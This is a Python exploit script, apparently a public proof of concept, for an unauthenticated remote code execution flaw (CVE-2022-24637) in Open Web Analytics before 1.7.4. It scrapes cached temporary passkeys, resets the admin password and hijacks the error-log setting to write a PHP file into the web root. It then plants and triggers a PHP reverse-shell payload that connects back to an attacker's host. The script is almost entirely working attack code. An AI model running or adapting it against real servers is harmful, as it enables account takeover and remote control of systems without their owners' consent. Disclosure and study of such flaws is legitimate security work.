# Exploit Title: Open Web Analytics (OWA) - Unauthenticated Remote Code Execution
# Date: October 08, 2022
# Exploit Author: hupe1980
# Version: Open Web Analytics (OWA) before 1.7.4
# Tested on: Linux
# CVE: CVE-2022-24637

#!/usr/bin/env python3

import argparse
import requests
import urllib3
import hashlib
import re
import base64
import string
from random import choice

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

default_payload = '<?php $sock=fsockopen("{LHOST}",{LPORT});$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'

def random_string(length=8):
    return ''.join(choice(f"{string.ascii_letters}{string.digits}") for i in range(length))


class POC:
    def __init__(self, target, username, password, payload):
        self.base_url = target.rstrip("/")
        self.username = username
        self.password = password
        self.payload = payload

        self.session = requests.Session()


    def exploit(self):
        print("[+] Check if the target is vulnerable to CVE-2022-24637")
        self.check()
        
        print(f"[+] Generate cache for user {self.username}")
        self._login(self.username, self.username)
        print(f"[+] Cache created")

        print(f"[+] Search temp passkey in cache for user {self.username}")
        temp_passkey = self._search_temp_passkey()
        if not temp_passkey:
            print(f"Cannot find temp passkey for user {self.username}")
            exit(1)
        else:
            print(f"[+] Temp passkey found")
        
        print(f"[i] Temp passkey for user {self.username} => {temp_passkey}")

        print(f"[+] Reset password for user {self.username}")
        self._reset_password(temp_passkey)
        print(f"[+] Password changed! New creds => {self.username}:{self.password}")

        print(f"[+] Login with new creds")
        self._login(self.username, self.password)
        print(f"[+] Login successful")

        print("[+] Extracting nonce")
        nonce = self._get_nonce()
        print(f"[+] Nonce extracted => {nonce}")

        payload_filename = f"{random_string()}.php"

        print(f"[+] Creating log file {payload_filename}")
        self._create_log(payload_filename, nonce)
        print(f"[+] File created")

        print("[+] Write payload to log file")
        self._write_payload(nonce)
        print(f"[+] Log file updated")

        print("[+] Triggering payload")
        payload_url = self._trigger_payload(payload_filename)
        print("[+] Payload triggered. Check your listener!")
        print(f"[i] You can re-trigger the payload with the following command\n=> curl {payload_url}")


    def check(self):
        r = self.session.get(self.base_url, verify=False)

        if 'Open Web Analytics' not in r.text:
            print('[-] Cannot confirm that the target is hosting OWA')
        elif 'version=1.7.3' not in r.text:
            print('[-] Cannot confirm the version is vulnerable')
        else:
            print('[!] The target is vulnerable')


    def _login(self, username, password):
        login_url = f"{self.base_url}/index.php?owa_do=base.loginForm"

        data = {
            "owa_user_id": username,
            "owa_password": password,
            "owa_action": "base.login"
        }

        self.session.post(login_url, data=data, verify=False)

    def _reset_password(self, temp_passkey):
        reset_password_url = f"{self.base_url}/index.php?owa_do=base.usersPasswordEntry"
        
        data = {
            "owa_password": self.password,
            "owa_password2": self.password,
            "owa_k": temp_passkey,
            "owa_action":
            "base.usersChangePassword"
        }

        self.session.post(reset_password_url, data=data, verify=False)

    def _search_temp_passkey(self):
        for key in range(100):
            user_id = f"user_id{str(key)}"
            hash = hashlib.md5(user_id.encode()).hexdigest()
            cache_url = f"{self.base_url}/owa-data/caches/{str(key)}/owa_user/{hash}.php"
            
            r = self.session.get(cache_url)
            if r.status_code != 200:
                continue

            regex_result = re.search(r'\*(\w*)\*', r.text) 
            if not regex_result:
                continue

            cache_base64 = regex_result.group(1)
            cache = base64.b64decode(cache_base64).decode("ascii")

            username = re.search(r'"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"', cache).group(1)
            temp_passkey = re.search(r'"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"', cache).group(1)
            
            if self.username != username:
                print(f"[!] Found temporary password for a different user: {username}:{temp_passkey}")
                continue
            
            return temp_passkey
    
    def _get_nonce(self):
        options_url = f"{self.base_url}/index.php?owa_do=base.optionsGeneral"
        r = self.session.get(options_url, verify=False)
        return re.search(r'owa_nonce" value="(\w*)"', r.text).group(1)

    def _create_log(self, payload_filename, nonce):
        options_url = f"{self.base_url}/index.php?owa_do=base.optionsGeneral"
        
        data = {
            "owa_nonce": nonce, 
            "owa_action": "base.optionsUpdate", 
            "owa_config[base.error_log_file]": f"/var/www/html/owa/owa-data/caches/{payload_filename}", 
            "owa_config[base.error_log_level]": 2
        }

        self.session.post(options_url, data=data, verify=False)

    def _write_payload(self, nonce):
        options_url = f"{self.base_url}/index.php?owa_do=base.optionsGeneral"

        data = {
            "owa_nonce": nonce, 
            "owa_action": "base.optionsUpdate", 
            "owa_config[shell]": self.payload 
        }
        
        self.session.post(options_url, data=data, verify=False)


    def _trigger_payload(self, payload_filename):
        payload_url = f"{self.base_url}/owa-data/caches/{payload_filename}"
        self.session.get(payload_url, verify=False)

        return payload_url


def main():
    parser = argparse.ArgumentParser(description="Open Web Analytics (OWA) - Unauthenticated Remote Code Execution")

    parser.add_argument("target")
    parser.add_argument("lhost")
    parser.add_argument("lport")
    parser.add_argument("-u", "--username", type=str, default="admin", help="username to exploit (default: admin)")
    parser.add_argument("-p", "--password", type=str, default=random_string(), help="new password for the exploited user (default: random)")
    parser.add_argument("--custom_payload", type=str, default="", help="custom payload")
    parser.add_argument("--check", type=bool, default=False, help="only check if target is vulnerable")

    args = parser.parse_args()

    payload = args.custom_payload if args.custom_payload else default_payload
    payload = payload.format(LHOST=args.lhost, LPORT=args.lport)

    exploit = POC(args.target, args.username, args.password, payload)
    if args.check:
        exploit.check()
    else:
        exploit.exploit()


if __name__ == "__main__":
    main()
